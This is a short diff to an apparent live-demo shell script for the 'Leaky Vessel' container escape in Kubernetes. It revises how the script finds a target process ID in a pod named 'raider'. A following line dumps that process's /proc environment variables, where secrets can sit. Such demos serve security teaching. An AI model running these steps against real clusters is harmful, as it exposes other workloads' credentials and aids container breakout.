@@ -77,8 +77,7 @@ pei "kubectl exec -it raider -- ps faux"
 pe "clear"
 
 p "# Get the process ID with some bash"
-pei "export LEAKY_VESSEL_PID=\$(kubectl exec -it raider -- /bin/sh -c \"ps faux | grep '/bin/sh /sleep.sh' | awk '{print \\\$2}' | head -n 1 | tr -d '\\\\r\\\\n' \") && echo \$LEAKY_VESSEL_PID"
-
+pei "export LEAKY_VESSEL_PID=\$(kubectl exec raider -- /bin/sh -c \"ps faux | grep '[s]leep.sh' | awk '{print \\\$2}' | head -n 1\") && echo \$LEAKY_VESSEL_PID"
 p "# View the environment variables within Leaky Vessel"
 pei "kubectl exec -it raider -- /bin/sh -c \"cat /proc/\$LEAKY_VESSEL_PID/environ | tr '\\\\0' '\\\\n'\""
 
